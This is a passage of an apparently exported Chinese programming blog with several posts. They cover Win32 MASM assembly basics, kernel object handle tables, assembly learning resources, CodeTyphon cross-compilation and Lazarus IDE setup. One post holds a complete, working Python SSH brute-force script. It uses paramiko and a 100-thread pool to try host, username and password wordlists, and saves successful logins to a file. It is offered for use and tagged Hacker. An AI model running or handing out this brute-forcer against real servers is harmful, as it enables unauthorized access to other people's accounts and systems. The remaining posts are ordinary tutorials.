<ul>
<li><code>hWnd</code> 是父窗口的句柄。句柄代表您引用的窗口的一个地址指针。它的值对您编 Windows 程序并不重要（译者注：如果您想成为高手则是必须的），您只要知道它代表一个窗口。当您要对窗口做任何操作时，必须要引用该窗口的指针。 </li>
<li><code>lpText</code> 是指向您要显示的文本的指针。指向文本串的指针事实上就是文本串的首地址。 </li>
<li><code>lpCaption</code> 是指向您要显示的对话框的标题文本串指针。 </li>
<li><code>uType</code> 是显示在对话框窗口上的小图标的类型。</li>
</ul>
<p>下面是源程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386 </span><br><span class="line">.model flat,stdcall </span><br><span class="line">option casemap:none </span><br><span class="line">include \masm32\include\windows.inc </span><br><span class="line">include \masm32\include\kernel32.inc </span><br><span class="line">includelib \masm32\lib\kernel32.lib </span><br><span class="line">include \masm32\include\user32.inc </span><br><span class="line">includelib \masm32\lib\user32.lib </span><br><span class="line"></span><br><span class="line">.data </span><br><span class="line">MsgBoxCaption db &quot;可爱的标题&quot;，0</span><br><span class="line">MsgBoxText    db &quot;你好，我的第一个Win32汇编程序&quot;，0</span><br><span class="line"></span><br><span class="line">.code </span><br><span class="line">start: </span><br><span class="line">invoke MessageBox, NULL, addr MsgBoxText, addr MsgBoxCaption, MB_OK </span><br><span class="line">invoke ExitProcess, NULL </span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p>编译、链接上面的程序段，得到可执行文件。运行，哈哈，窗口上弹出了一个对话框，上面有一行字：“你好，我的第一个Win32汇编程序”。</p>
<p>好，我们回过头来看看上面的源代码。我们在.DATA“分段”定义了两个NULL结尾的字符串。我们用了两个常量：<code>NULL</code> 和 <code>MB_OK</code>。这些常量在windows.inc 文件中有定义，使用常量使得您的程序有较好的可读性。 <code>addr</code> 操作符用来把标号的地址传递给被调用的函数，它只能用在 <code>invoke</code> 语句中，譬如您不能用它来把标号的地址赋给寄存器或变量，如果想这样做则要用 <code>offset</code> 操作符。在 <code>offset</code> 和 <code>addr</code> 之间有如下区别：</p>
<p><code>addr</code>不可以处理向前引用，<code>offset</code>则能。所谓向前引用是指：标号的定义是在<code>invoke</code> 语句之后，譬如在如下的例子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">invoke MessageBox，NULL， addr MsgBoxText，addr MsgBoxCaption，MB_OK</span><br><span class="line"></span><br><span class="line">...... </span><br><span class="line"></span><br><span class="line">MsgBoxCaption db &quot;可爱的标题&quot;，0</span><br><span class="line">MsgBoxText db &quot;你好，我的第一个Win32汇编程序&quot;，0</span><br></pre></td></tr></table></figure>
<p>如果您是用 <code>addr</code> 而不是 <code>offset</code> 的话，那 MASM 就会报错。</p>
<p><code>addr</code>可以处理局部变量而 <code>offset</code> 则不能。局部变量只是在运行时在堆栈中分配内存空间。而 <code>offset</code> 则是在编译时由编译器解释，这显然不能用 <code>offset</code> 在运行时来分配内存空间。编译器对 <code>addr</code> 的处理是先检查处理的是全局还是局部变量，若是全局变量则把其地址放到目标文件中，这一点和 <code>offset</code> 相同，若是局部变量，就在执行 <code>invoke</code> 语句前产生如下指令序列： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lea eax， LocalVar</span><br><span class="line">push eax</span><br></pre></td></tr></table></figure>
<p>因为<code>lea</code>指令能够在运行时决定标号的有效地址，所以有了上述指令序列，就可以保证 <code>invoke</code> 的正确执行了。 </p>
<h3 id="更方便的编译选择：Visual-MASM"><a href="#更方便的编译选择：Visual-MASM" class="headerlink" title="更方便的编译选择：Visual MASM"></a>更方便的编译选择：Visual MASM</h3><p>新建一个asm后缀文件，用Visual MASM打开，把上面的代码复制进去，点击左上角的Run即可，如图所示。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fo72650fqnj20ux0ian06.jpg" alt=""></p>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>读书笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Win32汇编学习(1)：基本概念</title>
    <url>/2018/02/05/Win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1-%EF%BC%9A%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html</url>
    <content><![CDATA[<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>Windows 把每一个 Win32 应用程序放到分开的虚拟地址空间中去运行，也就是说每一个应用程序都拥有其相互独立的 4GB 地址空间，当然这倒不是说它们都拥有 4GB 的物理地址空间，而只是说能够在 4GB 的范围内寻址。操作系统将会在应用程序运行时完成 4GB 的虚拟地址和物理内存地址间的转换。这就要求编写应用程序时必须格守 Windows 的规范，否则极易引起内存的保护模式错误。而过去的 Win16 内存模式下，所有的应用程序都运行于同一个 4GB 地址空间，它们可以彼此”看”到别的程序的内容，这极易导致一个应用程序破坏另一个应用程序甚至是操作系统的数据或代码。  </p>
<a id="more"></a>
<p>和 16 位 Windows 下的把代码分成 DATA，CODE 等段的内存模式不同，WIN32 只有一种内存模式，即 FLAT 模式，意思是”平坦”的内存模式，再没有 64K 的段大小限制，所有的 WIN32 的应用程序运行在一个连续、平坦、巨大的 4GB 的空间中。这同时也意味着您无须和段寄存器打交道，您可以用任意的段寄存器寻址任意的地址空间，这对于程序员来说是非常方便的，这也使得用32位汇编语言和用C语言一样方便。 在Win32下编程，有许多重要的规则需要遵守。有一条很重要的是：Windows 在内部频繁使用 ESI，EDI，EBP，EBX 寄存器，而且并不去检测这些寄存器的值是否被更改，这样当您要使用这些寄存器时必须先保存它们的值，待用完后再恢复它们，一个最显著的应用例子就是 Windows 的 CallBack 函数中。   </p>
<h2 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h2><p>一般的Win32汇编都有下面的程序段，这是一个Win32汇编编程的基础框架，若您现在还不知道这些指令的确切意义的话，没关系， 随后我就会给大家详细解释。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386 </span><br><span class="line">.MODEL Flat, STDCALL </span><br><span class="line">.DATA </span><br><span class="line">    &lt;Your initialized data&gt; </span><br><span class="line">    ...... </span><br><span class="line">.DATA? </span><br><span class="line">   &lt;Your uninitialized data&gt; </span><br><span class="line">   ...... </span><br><span class="line">.CONST </span><br><span class="line">   &lt;Your constants&gt; </span><br><span class="line">   ...... </span><br><span class="line">.CODE </span><br><span class="line">   &lt;label&gt; </span><br><span class="line">    &lt;Your code&gt; </span><br><span class="line">   ..... </span><br><span class="line">    end &lt;label&gt;</span><br></pre></td></tr></table></figure></p>
<p>这就是一般Win32汇编编程的基础框架，其中各个关键词的解释说明如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.386</span><br></pre></td></tr></table></figure>
<p>这是一个汇编语言伪指令，他告诉编译器我们的程序是使用80386指令集编写的。您还可以使用 .486、.586， 但最安全的还是使用.386。对于每一种CPU有两套几乎功能相同伪指令： .386/.386P、 486/.486P、 586/.586P。 带P的指令标明您的程序中可以用特权级指令。特权级指令是保留给操作系统的，如虚拟设备驱动程序。在大多数时间，您的程序都无须运行在RING0层，故用不带后缀P的伪指令已足够了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.MODEL FLAT，STDCALL</span><br></pre></td></tr></table></figure>
<p><code>.MODEL</code> 是用来指定内存模式的伪指令，在Win32下，只有一种内存模型，那就是FLAT。 <code>STDCALL</code> 告诉编译器参数的传递约定。参数的传递约定是指参数传达时的顺序(从左到右或从右到左)和由谁恢复堆栈指针(调用者或被调用者)。在Win16下有两种约定：<code>C</code> 和 <code>PASCAL</code>。C 约定规定参数传递顺序是从右到左，即最右边的参数最先压栈，由调用者恢复堆栈指针。</p>
<p>例如：为调用函数 <code>foo ( int first_param， int second_param， int third_param )</code>； 按C约定的汇编代码应该是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push [third_param]</span><br><span class="line">push [second_param]</span><br><span class="line">push [first_param]</span><br><span class="line">call foo</span><br><span class="line">add esp， 3 * 4 ;调用者自己恢复堆栈指针</span><br></pre></td></tr></table></figure>
<p><code>PASCAL</code>约定和<code>C</code>约定正好相反，它规定参数是从左向右传递，由被调用者恢复堆栈。Win16采用了<code>PASCAL</code>约定， 因为<code>PASCAL</code>约定产生的代码量要小。当不知道参数的个数时，<code>C</code>约定特别有用。如在函数<code>wsprintf ()</code> 中， <code>wsprintf</code>预先并不知道要传递几个参数，所以它不知道如何恢复堆栈。<code>STDCALL</code>是<code>C</code>约定和<code>PASCAL</code>约定的混合体，它规定参数的传递是从右到左，恢复堆栈的工作交由被调用者。Win32只用<code>STDCALL</code>约定，但除了一个特例，即：<code>wsprintf</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.DATA </span><br><span class="line">.DATA? </span><br><span class="line">.CONST </span><br><span class="line">.CODE</span><br></pre></td></tr></table></figure>
<p>上面的四个伪指令是”分段”(SECTION)伪指令。我们上面刚讲过Win32下没有”段”(SEGMENT)的概念，但是您可以把您的程序分成不同的”分段”， 一个”分段”的开始即是上一个”分段”的结束。WIN32中只有两种性质的”分段”：<code>DATA</code>和<code>CODE</code>。</p>
<p>其中DATA”分段”又分为三种：</p>
<ul>
<li><code>.DATA</code> 其中包括已初始化的数据。</li>
<li><code>.DATA?</code> 其中包括未初始化的数据。比如有时您仅想预先分配一些内存但并不想指定初始值。使用未初始化的数据的优点是它不占据可执行文件的大小，如：若您要在 <code>.DATA?</code> 段中分配10,000字节的空间，您的可执行文件的大小无须增加10,000字节，而仅仅是要告诉编译器在装载可执行文件时分配所需字节。</li>
<li><code>.CONST</code> 其中包括常量定义。这些常量在程序运行过程中是不能更改的。 应用程序并不需要以上所有的三个”分段”， 可以根据需要进行定义。 </li>
<li><code>.CODE</code> 这是代码”分段”。 <blockquote>
<p>实际上，分段并不是象在 Dos 下一样，为不同的段分别指出不同的段寄存器，因为 Windows 下只有一个 4GB 的段，Windows 程序中的分段表现在当程序装载时，赋予不同的分段不同的属性，比如说当你的程序加载时，对于 Ring3 程序来说，.code 段是不可写的，而 .data 段是可写的，如果你尝试象在 Dos 下一样写自己的代码部分，你会得到一个蓝屏错误</p>
</blockquote>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;label&gt; </span><br><span class="line">end &lt;label&gt;</span><br></pre></td></tr></table></figure>
<p>是用来唯一标识您的代码范围的标签， 两个标签必须相同，应用程序的所有可执行代码必须在两个标签之间。</p>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>读书笔记</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>win32汇编(ASM)学习资源</title>
    <url>/2018/02/04/win32%E6%B1%87%E7%BC%96-ASM-%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90.html</url>
    <content><![CDATA[<p>一些win32汇编下学习资源与工具收集</p>
<a id="more"></a>
<h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><ul>
<li><a href="http://www.aogosoft.com/" target="_blank" rel="noopener">AoGo汇编小站(MASMPlus作者)</a></li>
<li><a href="http://icodeguru.com/Embedded/winasm/index.html" target="_blank" rel="noopener">Win32Asm教程在线版</a></li>
<li><p><a href="https://files.cnblogs.com/files/Akkuman/winasm.chm.7z" target="_blank" rel="noopener">Win32Asm教程博客园文件备份版</a><br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fo72731wbtj20kp0h247i.jpg" alt=""></p>
</li>
<li><p><a href="https://files.cnblogs.com/files/Akkuman/Masm32%E8%A1%A5%E5%85%85%E6%95%99%E7%A8%8B%E7%B3%BB%E5%88%97.chm.7z" target="_blank" rel="noopener">Masm32补充教程系列</a><br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fo727e56z1j20hs0dcq67.jpg" alt=""></p>
</li>
<li><p><a href="https://files.cnblogs.com/files/Akkuman/Win32ASMTRK.chm.7z" target="_blank" rel="noopener">Win32 ASM Tutorial Resource Kit</a>：dREAMtHEATER收集的WIN32ASM教程，内容很全，包括32位汇编的基础知识，Iczelion的经典教程中英文版，罗云彬的32位汇编教程，还有PE格式和VxD的一些内容。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fo727jul82j20ln0ettaz.jpg" alt=""></p>
</li>
</ul>
<h2 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h2><ul>
<li><a href="http://www.aogosoft.com/masmplus/" target="_blank" rel="noopener">MASMPlus</a></li>
<li><a href="http://www.visualmasm.com/" target="_blank" rel="noopener">Visual MASM(推荐)</a></li>
<li><a href="https://github.com/mrfearless/RadASM2" target="_blank" rel="noopener">RadASM2_fork</a></li>
<li><a href="https://bbs.pediy.com/thread-210513.htm" target="_blank" rel="noopener">RadAsm 3.x支持中文注释</a></li>
<li><a href="https://dman95.github.io/SASM/english.html" target="_blank" rel="noopener">SASM</a></li>
<li><a href="http://easycode.cat/English/" target="_blank" rel="noopener">Easy Code</a></li>
</ul>
]]></content>
      <categories>
        <category>汇编(ASM)</category>
      </categories>
      <tags>
        <tag>ASM</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows进程的内核对象句柄表</title>
    <url>/2018/02/04/Windows%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1%E5%8F%A5%E6%9F%84%E8%A1%A8.html</url>
    <content><![CDATA[<p>当一个进程被初始化时,系统要为它分配一个句柄表。该句柄表只用于内核对象 ,不用于用户对象或GDI对象。  </p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foaobsqowpj20nz05c0t3.jpg" alt=""></p>
<a id="more"></a>
<h2 id="创建内核对象"><a href="#创建内核对象" class="headerlink" title="创建内核对象"></a>创建内核对象</h2><p>当进程初次被初始化时，它的句柄表是空的。然后，当进程中的线程调用创建内核对象的函数时，比如CreateFileMapping，内核就为该对象分配一个内存块，并对它初始化。这时，内核对进程的句柄表进行扫描，找出一个空项。由于表 3 - 1中的句柄表是空的，内核便找到索引1位置上的结构并对它进行初始化。该指针成员将被设置为内核对象的数据结构的内存地址，访问屏蔽设置为全部访问权，同时，各个标志也作了设置。  </p>
<p>下面列出了用于创建内核对象的一些函数（不是个完整的列表）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PSECURITY_ATTRIBUTE psa,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwStackSize,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPTHREAD_START_ROUTINE pfnStartAddr,</span></span></span><br><span class="line"><span class="function"><span class="params">    PVOID pvParam,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="function"><span class="params">    PDWORD pdwThreadId)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PCTSTR pszFileNAme,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwDesiredAccess,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwShareMode,</span></span></span><br><span class="line"><span class="function"><span class="params">    PSECURITY_ATTRIBUTES psa,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwCreationDistribution,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwFlagsAndAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hTemplateFile)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateFileMapping</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hFile,</span></span></span><br><span class="line"><span class="function"><span class="params">    PSECURITY_ATTRIBUTES psa,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD flPRotect,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwMaximumSizeHigh,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwMaximumSizeLow,</span></span></span><br><span class="line"><span class="function"><span class="params">    PCTSTR pszName)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">CreateSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    PSECURITY_ATTRIBUTES psa,</span></span></span><br><span class="line"><span class="function"><span class="params">    LONG lInitialCount,</span></span></span><br><span class="line"><span class="function"><span class="params">    LONG lMaximumCount,</span></span></span><br><span class="line"><span class="function"><span class="params">    PCTSTR pszName)</span></span>;</span><br></pre></td></tr></table></figure>
<p>用于创建内核对象的所有函数均返回与进程相关的句柄，这些句柄可以被在相同进程中运行的任何或所有线程成功地加以使用。该句柄值实际上是放入进程的句柄表中的索引，它用于标识内核对象的信息存放的位置。 因此当调试一个应用程序且观察内核对象句柄的实际值时，会看到一些较小的值，如1，2等。  </p>
<p>每当调用一个将内核对象句柄接受为参数的函数时，就要传递由一个 Create*&amp;函数返回的值。从内部来说，该函数要查看进程的句柄表，以获取要生成的内核对象的地址，然后按定义得很好的方式来生成该对象的数据结构。  </p>
<p>如果传递了一个无效索引（句柄），该函数便返回失败，而GetLastError则返回 6（ERROR_INVALID_HANDLE）。由于句柄值实际上是放入进程句柄表的索引，因此这些句柄是与进程相关的，并且不能由其他进程成功地使用。  </p>
<p>如果调用一个函数以便创建内核对象，但是调用失败了，那么返回的句柄值通常是0（NULL）。发生这种情况是因为系统的内存非常短缺，或者遇到了安全方面的问题。不过有少数函数在运行失败时返回的句柄值是-1（INVALID_HANDLE_VALUE）。例如，如果CreateFile未能打开指定的文件，那么它将返回INVALID_HANDLE_VALUE，而不是返回NULL。当查看创建内核对象的函数返回值时，必须格外小心。特别要注意的是，只有当调用CreateFile函数时，才能将该值与INVALID_HANDLE_VALUE进行比较。下面的代码是不正确的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HANDLE hMutex = CreateMutex(...);</span><br><span class="line"><span class="keyword">if</span> (hMutex == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">    <span class="comment">//这段代码不会执行，因为CreateMutex调用失败的时候返回的是NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，下面的代码也不正确：<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HANDLE hFile = CreateFile(...);</span><br><span class="line"><span class="keyword">if</span> (hFIle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="comment">//这段代码不会执行，因为CreateFile调用失败的时候返回的是INVALID_HANDLE_VALUE(-1)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="关闭内核对象"><a href="#关闭内核对象" class="headerlink" title="关闭内核对象"></a>关闭内核对象</h2><p>无论怎样创建内核对象，都要向系统指明将通过调用C l o s e H a n d l e来结束对该对象的操作：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">CloseHandle</span><span class="params">(HANDLE hobj)</span></span>;</span><br></pre></td></tr></table></figure>
<p>如果该句柄是有效的，那么系统就可以获得内核对象的数据结构的地址，并可确定该结构中的使用计数的数据成员。如果使用计数是0，该内核便从内存中撤消该内核对象。  </p>
<p>如果将一个无效句柄传递给CloseHandle，将会出现两种情况之一。如果进程运行正常，CloseHandle返回FALSE，而GetLastError则返回ERROR_INVALID_HANDLE。如果进程正在排除错误，系统将通知调试程序，以便能排除它的错误。 </p>
<p>在CloseHandle返回之前，它会清除进程的句柄表中的项目，该句柄现在对你的进程已经无效，不应该试图使用它。无论内核对象是否已经撤消，都会发生清除操作。当调用CloseHandle函数之后，将不再拥有对内核对象的访问权，不过，如果该对象的使用计数没有递减为0，那么该对象尚未被撤消。这没有问题，它只是意味着一个或多个其他进程正在使用该对象。当其他进程停止使用该对象时（通过调用CloseHandle），该对象将被撤消。  </p>
<p>假如忘记调用CloseHandle函数，那么会不会出现内存泄漏呢？答案是可能的，但是也不一定。在进程运行时，进程有可能泄漏资源（如内核对象）。但是，当进程终止运行时，操作系统能够确保该进程使用的任何资源或全部资源均被释放，这是有保证的。对于内核对象来说，系统将执行下列操作：当进程终止运行时，系统会自动扫描进程的句柄表。如果该表拥有任何无效项目（即在终止进程运行前没有关闭的对象），系统将关闭这些对象句柄。如果这些对象中的任何对象的使用计数降为0，那么内核便撤消该对象。  </p>
<p>因此，应用程序在运行时有可能泄漏内核对象，但是当进程终止运行时，系统将能确保所有内容均被正确地清除。另外，这个情况适用于所有对象、资源和内存块，也就是说，当进程终止运行时，系统将保证进程不会留下任何对象。  </p>
<h2 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h2><ul>
<li>《Windows核心编程》</li>
</ul>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>二进制</tag>
        <tag>系统</tag>
      </tags>
  </entry>
  <entry>
    <title>Python SSH爆破以及Python3线程池控制线程数</title>
    <url>/2018/01/13/Python-SSH%E7%88%86%E7%A0%B4%E4%BB%A5%E5%8F%8APython3%E7%BA%BF%E7%A8%8B%E6%B1%A0%E6%8E%A7%E5%88%B6%E7%BA%BF%E7%A8%8B%E6%95%B0.html</url>
    <content><![CDATA[<p>源自一个朋友的要求，他的要求是只爆破一个ip，结果出来后就停止，如果是爆破多个，完全没必要停止，等他跑完就好</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/env python</span></span><br><span class="line"><span class="comment">#!coding=utf-8</span></span><br><span class="line"></span><br><span class="line">__author__=<span class="string">'Akkuman'</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">SSH爆破，由于多线程的问题，我不知道怎么做可以出现结果马上停止（会查的，有更好的方法再改）</span></span><br><span class="line"><span class="string">现在我的方法是定义了一个全局的信号finish_flag，然后每个线程检查这个信号</span></span><br><span class="line"><span class="string">线程池用的concurrent.futures.ThreadPoolExecutor，是Py3的特性，py2需要安装其他的包</span></span><br><span class="line"><span class="string">成功结果写到了result.txt，可以通过检查目录下的result.txt文件查看结果</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">finish_flag = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">connect</span><span class="params">(host,user,pwd)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> finish_flag</span><br><span class="line">    <span class="keyword">if</span> finish_flag:</span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh=paramiko.SSHClient()</span><br><span class="line">        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">        ssh.connect(hostname=host,username=user,password=pwd)</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"[-]Login Succ u:%s p:%s h:%s"</span>%(user,pwd,host))</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'result.txt'</span>,<span class="string">'a+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="string">"h:%s u:%s p:%s\n"</span>%(host,user,pwd))</span><br><span class="line">        finish_flag = <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">except</span> paramiko.ssh_exception.SSHException <span class="keyword">as</span> err:</span><br><span class="line">        print(<span class="string">"[x]Login Fail u:%s p:%s"</span>%(user,pwd))</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 取得一个hostip,username,password</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getInfo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 遍历ip</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'host.txt'</span>) <span class="keyword">as</span> hosts:</span><br><span class="line">        <span class="keyword">for</span> host <span class="keyword">in</span> hosts:</span><br><span class="line">            hostip = host.strip()</span><br><span class="line">            print(<span class="string">"[x]Target:"</span>+host)</span><br><span class="line">            <span class="comment"># 遍历用户名</span></span><br><span class="line">            <span class="keyword">with</span> open(<span class="string">'user.txt'</span>) <span class="keyword">as</span> users:</span><br><span class="line">                <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">                    username = user.strip()</span><br><span class="line">                    <span class="comment"># 遍历密码</span></span><br><span class="line">                    <span class="keyword">with</span> open(<span class="string">'pwd.txt'</span>) <span class="keyword">as</span> pwds:</span><br><span class="line">                        <span class="keyword">for</span> pwd <span class="keyword">in</span> pwds:</span><br><span class="line">                            password = pwd.strip()</span><br><span class="line">                            <span class="keyword">yield</span> hostip,username,password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    paramiko.util.log_to_file(<span class="string">"filename.log"</span>) </span><br><span class="line">    info = getInfo()</span><br><span class="line">    <span class="comment"># 最大线程数</span></span><br><span class="line">    max_thread_num = <span class="number">100</span></span><br><span class="line">    executor = ThreadPoolExecutor(max_workers=max_thread_num)</span><br><span class="line">    <span class="keyword">for</span> host,user,pwd <span class="keyword">in</span> info:</span><br><span class="line">        future = executor.submit(connect,host,user,pwd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Hacker</tag>
      </tags>
  </entry>
  <entry>
    <title>CodeTyphon 跨平台交叉编译的配置</title>
    <url>/2018/01/01/CodeTyphon-Cross-Build.html</url>
    <content><![CDATA[<p>CodeTyphon和Lazarus的关系相当于就是ubuntu和linux的关系  </p>
<p>不过CodeTyphon提供了很多一键配置即可使用的交叉编译配置，而Lazarus就比较麻烦了，我也没用Lazarus交叉编译过  </p>
<p>首先假设我们交叉编译是在<strong>windows编译出linux可执行程序</strong>，那么我们需要做的事情大致上分为以下几步：<br><a id="more"></a></p>
<h2 id="下载跨平台交叉工具链-Download-Cross-Toolchains"><a href="#下载跨平台交叉工具链-Download-Cross-Toolchains" class="headerlink" title="下载跨平台交叉工具链(Download Cross Toolchains)"></a>下载跨平台交叉工具链(Download Cross Toolchains)</h2><p>框选出来的两个都可以</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e4098508.png" alt="TIM图片20180101212151.png"></p>
<p>然后选择我们所需的linux，平台cpu位数需要自己根据自己的需求来，选择好后点选最右边的下载标识等待下载（我们这里选择的<strong>win64-i386-linux</strong>）</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e3f83041.png" alt="TIM图片20180101212410.png"></p>
<h2 id="下载系统二进制库-Download-OSes-Libraries"><a href="#下载系统二进制库-Download-OSes-Libraries" class="headerlink" title="下载系统二进制库(Download OSes Libraries)"></a>下载系统二进制库(Download OSes Libraries)</h2><p>下载<strong>win64-i386-linux</strong>对应的库，你也可以选择qt4那个，只是界面库不一样而已</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e3f9f0f9.png" alt="TIM图片20180101212939.png"></p>
<h2 id="FPC-Cross-elements"><a href="#FPC-Cross-elements" class="headerlink" title="FPC Cross elements"></a>FPC Cross elements</h2><p>这一步就相当于写处理配置了，根据你选择的<strong>win64-i386-linux</strong>来</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e40e8a7a.png" alt="TIM图片20180101213357.png"></p>
<h2 id="Typhon的工程配置选择"><a href="#Typhon的工程配置选择" class="headerlink" title="Typhon的工程配置选择"></a>Typhon的工程配置选择</h2><p>前几步做好后，现在只需要在ide里面做一些设置即可了，我直接放图，应该大家能看懂<br>打开 <code>工程 &gt; 工程选项 &gt; 编译选项 &gt; 路径</code>把<code>Libraries</code>路径设置好</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e41f1894.png" alt="TIM图片20180101214030.png"></p>
<p>然后选择平台</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e412bc5e.png" alt="TIM图片20180101214132.png"></p>
<p>Lazarus和CodeTyphon编译出来的程序体积都比较大，减小体积可以把<code>generate debugging info for GDB</code>的选项去掉</p>
<p><img src="https://i.loli.net/2018/01/01/5a4a3e41635f5.png" alt="TIM图片20180101214407.png"></p>
<p>最后编译程序即可</p>
<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ul>
<li><a href="http://www.pilotlogic.com/sitejoom/index.php/93-wiki/ct-tutorials/222-cross-build-for-android" target="_blank" rel="noopener">CodeTyphon - Cross-Build for Android</a></li>
</ul>
]]></content>
      <categories>
        <category>Lazarus</category>
      </categories>
      <tags>
        <tag>Lazarus</tag>
        <tag>Delphi</tag>
      </tags>
  </entry>
  <entry>
    <title>Lazarus 分体式改成一体式窗口</title>
    <url>/2018/01/01/Lazarus-Whole-View.html</url>
    <content><![CDATA[<p>安装包  <code>anchordocking</code>和<code>Sparta_DockedFormEditor</code>  </p>
<p>然后点选<code>保存并重新编译IDE</code>即可</p>
]]></content>
      <categories>
        <category>Lazarus</category>
      </categories>
      <tags>
        <tag>Lazarus</tag>
        <tag>Delphi</tag>
      </tags>
  </entry>
  <entry>
